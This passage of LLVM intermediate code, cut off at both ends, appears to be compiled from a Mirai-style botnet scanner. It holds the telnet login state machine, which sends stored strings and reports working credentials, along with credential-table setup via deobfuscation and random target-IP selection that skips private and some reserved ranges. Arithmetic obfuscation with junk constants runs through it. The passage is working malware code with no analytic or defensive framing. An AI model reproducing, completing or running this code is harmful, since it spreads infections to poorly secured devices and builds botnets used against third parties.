  call void @table_unlock_val(i8 zeroext 7)
  %1009 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1009, i8** %40, align 8
  %1010 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1011 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1010, i32 0, i32 1
  %1012 = load i32, i32* %1011, align 8
  %1013 = load i8*, i8** %40, align 8
  %1014 = load i32, i32* %41, align 4
  %1015 = sext i32 %1014 to i64
  %1016 = call i64 @send(i32 %1012, i8* %1013, i64 %1015, i32 16384)
  %1017 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1018 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1017, i32 0, i32 1
  %1019 = load i32, i32* %1018, align 8
  %1020 = call i64 @send(i32 %1019, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1021 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1022 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1021, i32 0, i32 3
  store i32 9, i32* %1022, align 8
  br label %1023

; <label>:1023:                                   ; preds = %1008, %1004
  br label %1097

; <label>:1024:                                   ; preds = %878
  %1025 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1026 = call i32 @consume_any_prompt(%struct.scanner_connection* %1025)
  store i32 %1026, i32* %33, align 4
  %1027 = icmp sgt i32 %1026, 0
  br i1 %1027, label %1028, label %1043

; <label>:1028:                                   ; preds = %1024
  call void @table_unlock_val(i8 zeroext 8)
  %1029 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1029, i8** %42, align 8
  %1030 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1031 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1030, i32 0, i32 1
  %1032 = load i32, i32* %1031, align 8
  %1033 = load i8*, i8** %42, align 8
  %1034 = load i32, i32* %43, align 4
  %1035 = sext i32 %1034 to i64
  %1036 = call i64 @send(i32 %1032, i8* %1033, i64 %1035, i32 16384)
  %1037 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1038 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1037, i32 0, i32 1
  %1039 = load i32, i32* %1038, align 8
  %1040 = call i64 @send(i32 %1039, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1041 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1042 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1041, i32 0, i32 3
  store i32 10, i32* %1042, align 8
  br label %1043

; <label>:1043:                                   ; preds = %1028, %1024
  br label %1097

; <label>:1044:                                   ; preds = %878
  %1045 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1046 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1045)
  store i32 %1046, i32* %33, align 4
  %1047 = load i32, i32* %33, align 4
  %1048 = icmp eq i32 %1047, -1
  br i1 %1048, label %1049, label %1073

; <label>:1049:                                   ; preds = %1044
  %1050 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1051 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1050, i32 0, i32 1
  %1052 = load i32, i32* %1051, align 8
  %1053 = call i32 @close(i32 %1052)
  %1054 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1055 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1054, i32 0, i32 1
  store i32 -1, i32* %1055, align 8
  %1056 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1057 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1056, i32 0, i32 8
  %1058 = load i8, i8* %1057, align 8
  %1059 = sub i8 %1058, 84
  %1060 = add i8 %1059, 1
  %1061 = add i8 %1060, 84
  %1062 = add i8 %1058, 1
  store i8 %1061, i8* %1057, align 8
  %1063 = zext i8 %1061 to i32
  %1064 = icmp eq i32 %1063, 10
  br i1 %1064, label %1065, label %1070

; <label>:1065:                                   ; preds = %1049
  %1066 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1067 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1066, i32 0, i32 8
  store i8 0, i8* %1067, align 8
  %1068 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1069 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1068, i32 0, i32 3
  store i32 0, i32* %1069, align 8
  br label %1072

; <label>:1070:                                   ; preds = %1049
  %1071 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1071)
  br label %1072

; <label>:1072:                                   ; preds = %1070, %1065
  br label %1095

; <label>:1073:                                   ; preds = %1044
  %1074 = load i32, i32* %33, align 4
  %1075 = icmp sgt i32 %1074, 0
  br i1 %1075, label %1076, label %1094

; <label>:1076:                                   ; preds = %1073
  %1077 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1078 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1077, i32 0, i32 4
  %1079 = load i32, i32* %1078, align 4
  %1080 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1081 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1080, i32 0, i32 5
  %1082 = load i16, i16* %1081, align 8
  %1083 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1084 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1083, i32 0, i32 0
  %1085 = load %struct.scanner_auth*, %struct.scanner_auth** %1084, align 8
  call void @report_working(i32 %1079, i16 zeroext %1082, %struct.scanner_auth* %1085)
  %1086 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1087 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1086, i32 0, i32 1
  %1088 = load i32, i32* %1087, align 8
  %1089 = call i32 @close(i32 %1088)
  %1090 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1091 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1090, i32 0, i32 1
  store i32 -1, i32* %1091, align 8
  %1092 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1093 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1092, i32 0, i32 3
  store i32 0, i32* %1093, align 8
  br label %1094

; <label>:1094:                                   ; preds = %1076, %1073
  br label %1095

; <label>:1095:                                   ; preds = %1094, %1072
  br label %1097

; <label>:1096:                                   ; preds = %878
  store i32 0, i32* %33, align 4
  br label %1097

; <label>:1097:                                   ; preds = %1096, %1095, %1043, %1023, %1003, %983, %963, %943, %916, %889
  %1098 = load i32, i32* %33, align 4
  %1099 = icmp eq i32 %1098, 0
  br i1 %1099, label %1100, label %1101

; <label>:1100:                                   ; preds = %1097
  br label %1134

; <label>:1101:                                   ; preds = %1097
  %1102 = load i32, i32* %33, align 4
  %1103 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1103, i32 0, i32 6
  %1105 = load i32, i32* %1104, align 4
  %1106 = icmp sgt i32 %1102, %1105
  br i1 %1106, label %1107, label %1111

; <label>:1107:                                   ; preds = %1101
  %1108 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1109 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1108, i32 0, i32 6
  %1110 = load i32, i32* %1109, align 4
  store i32 %1110, i32* %33, align 4
  br label %1111

; <label>:1111:                                   ; preds = %1107, %1101
  %1112 = load i32, i32* %33, align 4
  %1113 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1114 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1113, i32 0, i32 6
  %1115 = load i32, i32* %1114, align 4
  %1116 = sub i32 %1115, 1041603624
  %1117 = sub i32 %1116, %1112
  %1118 = add i32 %1117, 1041603624
  %1119 = sub nsw i32 %1115, %1112
  store i32 %1118, i32* %1114, align 4
  %1120 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1121 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1120, i32 0, i32 7
  %1122 = getelementptr inbounds [256 x i8], [256 x i8]* %1121, i32 0, i32 0
  %1123 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1124 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1123, i32 0, i32 7
  %1125 = getelementptr inbounds [256 x i8], [256 x i8]* %1124, i32 0, i32 0
  %1126 = load i32, i32* %33, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds i8, i8* %1125, i64 %1127
  %1129 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1130 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1129, i32 0, i32 6
  %1131 = load i32, i32* %1130, align 4
  %1132 = sext i32 %1131 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1122, i8* %1128, i64 %1132, i32 1, i1 false)
  br label %1133

; <label>:1133:                                   ; preds = %1111
  br label %878

; <label>:1134:                                   ; preds = %1100
  br label %779

; <label>:1135:                                   ; preds = %865, %784
  br label %1136

; <label>:1136:                                   ; preds = %1135, %758
  br label %1137

; <label>:1137:                                   ; preds = %1136, %746, %706
  %1138 = load i32, i32* %1, align 4
  %1139 = sub i32 %1138, -1027961915
  %1140 = add i32 %1139, 1
  %1141 = add i32 %1140, -1027961915
  %1142 = add nsw i32 %1138, 1
  store i32 %1141, i32* %1, align 4
  br label %694

; <label>:1143:                                   ; preds = %694
  br label %233
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = sub i32 0, 1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, 1
  %14 = sext i32 %12 to i64
  %15 = mul i64 %14, 24
  %16 = call i8* @realloc(i8* %9, i64 %15) #6
  %17 = bitcast i8* %16 to %struct.scanner_auth*
  store %struct.scanner_auth* %17, %struct.scanner_auth** @auth_table, align 8
  %18 = load i8*, i8** %4, align 8
  %19 = call i8* @deobf(i8* %18, i32* %7)
  %20 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %21 = load i32, i32* @auth_table_len, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %20, i64 %22
  %24 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %23, i32 0, i32 0
  store i8* %19, i8** %24, align 8
  %25 = load i32, i32* %7, align 4
  %26 = trunc i32 %25 to i8
  %27 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %28 = load i32, i32* @auth_table_len, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %27, i64 %29
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %30, i32 0, i32 4
  store i8 %26, i8* %31, align 4
  %32 = load i8*, i8** %5, align 8
  %33 = call i8* @deobf(i8* %32, i32* %7)
  %34 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %35 = load i32, i32* @auth_table_len, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %34, i64 %36
  %38 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i32 0, i32 1
  store i8* %33, i8** %38, align 8
  %39 = load i32, i32* %7, align 4
  %40 = trunc i32 %39 to i8
  %41 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %42 = load i32, i32* @auth_table_len, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %41, i64 %43
  %45 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %44, i32 0, i32 5
  store i8 %40, i8* %45, align 1
  %46 = load i16, i16* @auth_table_max_weight, align 2
  %47 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %48 = load i32, i32* @auth_table_len, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %47, i64 %49
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %50, i32 0, i32 2
  store i16 %46, i16* %51, align 8
  %52 = load i16, i16* @auth_table_max_weight, align 2
  %53 = zext i16 %52 to i32
  %54 = load i16, i16* %6, align 2
  %55 = zext i16 %54 to i32
  %56 = add i32 %53, -1863422514
  %57 = add i32 %56, %55
  %58 = sub i32 %57, -1863422514
  %59 = add nsw i32 %53, %55
  %60 = trunc i32 %58 to i16
  %61 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %62 = load i32, i32* @auth_table_len, align 4
  %63 = add i32 %62, -416805953
  %64 = add i32 %63, 1
  %65 = sub i32 %64, -416805953
  %66 = add nsw i32 %62, 1
  store i32 %65, i32* @auth_table_len, align 4
  %67 = sext i32 %62 to i64
  %68 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %61, i64 %67
  %69 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %68, i32 0, i32 3
  store i16 %60, i16* %69, align 2
  %70 = load i16, i16* %6, align 2
  %71 = zext i16 %70 to i32
  %72 = load i16, i16* @auth_table_max_weight, align 2
  %73 = zext i16 %72 to i32
  %74 = add i32 %73, -1355507767
  %75 = add i32 %74, %71
  %76 = sub i32 %75, -1355507767
  %77 = add nsw i32 %73, %71
  %78 = trunc i32 %76 to i16
  store i16 %78, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

; <label>:6:                                      ; preds = %245, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = xor i32 255, -1
  %10 = xor i32 %8, %9
  %11 = and i32 %10, %8
  %12 = and i32 %8, 255
  %13 = trunc i32 %11 to i8
  store i8 %13, i8* %2, align 1
  %14 = load i32, i32* %1, align 4
  %15 = lshr i32 %14, 8
  %16 = xor i32 255, -1
  %17 = xor i32 %15, %16
  %18 = and i32 %17, %15
  %19 = and i32 %15, 255
  %20 = trunc i32 %18 to i8
  store i8 %20, i8* %3, align 1
  %21 = load i32, i32* %1, align 4
  %22 = lshr i32 %21, 16
  %23 = xor i32 %22, -1
  %24 = xor i32 255, -1
  %25 = xor i32 -813211805, -1
  %26 = or i32 %23, %24
  %27 = or i32 -813211805, %25
  %28 = xor i32 %26, -1
  %29 = and i32 %28, %27
  %30 = and i32 %22, 255
  %31 = trunc i32 %29 to i8
  store i8 %31, i8* %4, align 1
  %32 = load i32, i32* %1, align 4
  %33 = lshr i32 %32, 24
  %34 = xor i32 %33, -1
  %35 = xor i32 255, -1
  %36 = xor i32 -1466608421, -1
  %37 = or i32 %34, %35
  %38 = or i32 -1466608421, %36
  %39 = xor i32 %37, -1
  %40 = and i32 %39, %38
  %41 = and i32 %33, 255
  %42 = trunc i32 %40 to i8
  store i8 %42, i8* %5, align 1
  br label %43

; <label>:43:                                     ; preds = %6
  %44 = load i8, i8* %2, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 127
  br i1 %46, label %245, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i8, i8* %2, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %245, label %51

; <label>:51:                                     ; preds = %47
  %52 = load i8, i8* %2, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 3
  br i1 %54, label %245, label %55

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* %2, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 15
  br i1 %58, label %245, label %59

; <label>:59:                                     ; preds = %55
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 16
  br i1 %62, label %245, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* %2, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 56
  br i1 %66, label %245, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* %2, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 10
  br i1 %70, label %245, label %71

; <label>:71:                                     ; preds = %67
  %72 = load i8, i8* %2, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 192
  br i1 %74, label %75, label %79

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* %3, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 168
  br i1 %78, label %245, label %79

; <label>:79:                                     ; preds = %75, %71
  %80 = load i8, i8* %2, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 172
  br i1 %82, label %83, label %91

; <label>:83:                                     ; preds = %79
  %84 = load i8, i8* %3, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp sge i32 %85, 16
  br i1 %86, label %87, label %91

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp slt i32 %89, 32
  br i1 %90, label %245, label %91

; <label>:91:                                     ; preds = %87, %83, %79
  %92 = load i8, i8* %2, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 100
  br i1 %94, label %95, label %103

; <label>:95:                                     ; preds = %91
  %96 = load i8, i8* %3, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp sge i32 %97, 64
  br i1 %98, label %99, label %103

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* %3, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %101, 127
  br i1 %102, label %245, label %103

; <label>:103:                                    ; preds = %99, %95, %91
  %104 = load i8, i8* %2, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 169
  br i1 %106, label %107, label %111

; <label>:107:                                    ; preds = %103
  %108 = load i8, i8* %3, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sgt i32 %109, 254
  br i1 %110, label %245, label %111

; <label>:111:                                    ; preds = %107, %103
  %112 = load i8, i8* %2, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 198
  br i1 %114, label %115, label %123

; <label>:115:                                    ; preds = %111
  %116 = load i8, i8* %3, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp sge i32 %117, 18
  br i1 %118, label %119, label %123

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* %3, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %121, 20
  br i1 %122, label %245, label %123

; <label>:123:                                    ; preds = %119, %115, %111
  %124 = load i8, i8* %2, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp sge i32 %125, 224
  br i1 %126, label %245, label %127

; <label>:127:                                    ; preds = %123
  %128 = load i8, i8* %2, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 106
  br i1 %130, label %131, label %135

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* %3, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 186
  br i1 %134, label %245, label %135

; <label>:135:                                    ; preds = %131, %127
  %136 = load i8, i8* %2, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 106
  br i1 %138, label %139, label %143

; <label>:139:                                    ; preds = %135
  %140 = load i8, i8* %3, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 187
  br i1 %142, label %245, label %143

; <label>:143:                                    ; preds = %139, %135
  %144 = load i8, i8* %2, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 106
  br i1 %146, label %147, label %151

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 185
  br i1 %150, label %245, label %151

; <label>:151:                                    ; preds = %147, %143
  %152 = load i8, i8* %2, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 106
  br i1 %154, label %155, label %159

; <label>:155:                                    ; preds = %151
  %156 = load i8, i8* %3, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 184
  br i1 %158, label %245, label %159

; <label>:159:                                    ; preds = %155, %151
  %160 = load i8, i8* %2, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 150
  br i1 %162, label %163, label %167

; <label>:163:                                    ; preds = %159
  %164 = load i8, i8* %3, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 31
  br i1 %166, label %245, label %167

; <label>:167:                                    ; preds = %163, %159
  %168 = load i8, i8* %2, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 49
  br i1 %170, label %171, label %175

; <label>:171:                                    ; preds = %167
  %172 = load i8, i8* %3, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 51
  br i1 %174, label %245, label %175

; <label>:175:                                    ; preds = %171, %167
  %176 = load i8, i8* %2, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 178
  br i1 %178, label %179, label %183

; <label>:179:                                    ; preds = %175
  %180 = load i8, i8* %3, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 62
  br i1 %182, label %245, label %183

; <label>:183:                                    ; preds = %179, %175
  %184 = load i8, i8* %2, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 160
  br i1 %186, label %187, label %191

; <label>:187:                                    ; preds = %183
  %188 = load i8, i8* %3, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 13
  br i1 %190, label %245, label %191

; <label>:191:                                    ; preds = %187, %183
  %192 = load i8, i8* %2, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 6
  br i1 %194, label %243, label %195

; <label>:195:                                    ; preds = %191
  %196 = load i8, i8* %2, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 7
  br i1 %198, label %243, label %199

; <label>:199:                                    ; preds = %195
  %200 = load i8, i8* %2, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 11
  br i1 %202, label %243, label %203

; <label>:203:                                    ; preds = %199
  %204 = load i8, i8* %2, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 21
  br i1 %206, label %243, label %207

; <label>:207:                                    ; preds = %203
  %208 = load i8, i8* %2, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 22
  br i1 %210, label %243, label %211

; <label>:211:                                    ; preds = %207
  %212 = load i8, i8* %2, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 26
  br i1 %214, label %243, label %215

; <label>:215:                                    ; preds = %211
  %216 = load i8, i8* %2, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 28
  br i1 %218, label %243, label %219

; <label>:219:                                    ; preds = %215
  %220 = load i8, i8* %2, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 29
  br i1 %222, label %243, label %223

; <label>:223:                                    ; preds = %219
  %224 = load i8, i8* %2, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 30
  br i1 %226, label %243, label %227

; <label>:227:                                    ; preds = %223
  %228 = load i8, i8* %2, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 33
  br i1 %230, label %243, label %231

; <label>:231:                                    ; preds = %227
  %232 = load i8, i8* %2, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 55
  br i1 %234, label %243, label %235

; <label>:235:                                    ; preds = %231
  %236 = load i8, i8* %2, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp eq i32 %237, 214
  br i1 %238, label %243, label %239

; <label>:239:                                    ; preds = %235
  %240 = load i8, i8* %2, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 215
  br label %243

; <label>:243:                                    ; preds = %239, %235, %231, %227, %223, %219, %215, %211, %207, %203, %199, %195, %191
  %244 = phi i1 [ true, %235 ], [ true, %231 ], [ true, %227 ], [ true, %223 ], [ true, %219 ], [ true, %215 ], [ true, %211 ], [ true, %207 ], [ true, %203 ], [ true, %199 ], [ true, %195 ], [ true, %191 ], [ %242, %239 ]
  br label %245

; <label>:245:                                    ; preds = %243, %187, %179, %171, %163, %155, %147, %139, %131, %123, %119, %107, %99, %87, %75, %67, %63, %59, %55, %51, %47, %43
  %246 = phi i1 [ true, %187 ], [ true, %179 ], [ true, %171 ], [ true, %163 ], [ true, %155 ], [ true, %147 ], [ true, %139 ], [ true, %131 ], [ true, %123 ], [ true, %119 ], [ true, %107 ], [ true, %99 ], [ true, %87 ], [ true, %75 ], [ true, %67 ], [ true, %63 ], [ true, %59 ], [ true, %55 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ %244, %243 ]
  br i1 %246, label %6, label %247

; <label>:247:                                    ; preds = %245
  %248 = load i8, i8* %2, align 1
  %249 = zext i8 %248 to i32
  %250 = shl i32 %249, 24
  %251 = load i8, i8* %3, align 1
  %252 = zext i8 %251 to i32
  %253 = shl i32 %252, 16
  %254 = and i32 %250, %253
  %255 = xor i32 %250, %253
  %256 = or i32 %254, %255
  %257 = or i32 %250, %253
  %258 = load i8, i8* %4, align 1
  %259 = zext i8 %258 to i32
  %260 = shl i32 %259, 8
  %261 = xor i32 %256, -1
  %262 = xor i32 %260, -1
  %263 = xor i32 -2115123235, -1
  %264 = and i32 %261, -2115123235
  %265 = and i32 %256, %263
  %266 = and i32 %262, -2115123235
  %267 = and i32 %260, %263
  %268 = or i32 %264, %265
  %269 = or i32 %266, %267
  %270 = xor i32 %268, %269
  %271 = or i32 %261, %262
  %272 = xor i32 %271, -1
  %273 = or i32 -2115123235, %263
  %274 = and i32 %272, %273
  %275 = or i32 %270, %274
  %276 = or i32 %256, %260
  %277 = load i8, i8* %5, align 1
  %278 = zext i8 %277 to i32
  %279 = shl i32 %278, 0
  %280 = xor i32 %275, -1
  %281 = xor i32 %279, -1
  %282 = xor i32 508019016, -1
  %283 = and i32 %280, 508019016
  %284 = and i32 %275, %282
  %285 = and i32 %281, 508019016
  %286 = and i32 %279, %282
  %287 = or i32 %283, %284
  %288 = or i32 %285, %286
  %289 = xor i32 %287, %288
  %290 = or i32 %280, %281
  %291 = xor i32 %290, -1
  %292 = or i32 508019016, %282
  %293 = and i32 %291, %292
  %294 = or i32 %289, %293
  %295 = or i32 %275, %279
  %296 = call i32 @htonl(i32 %294) #7
  ret i32 %296
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %74

; <label>:21:                                     ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
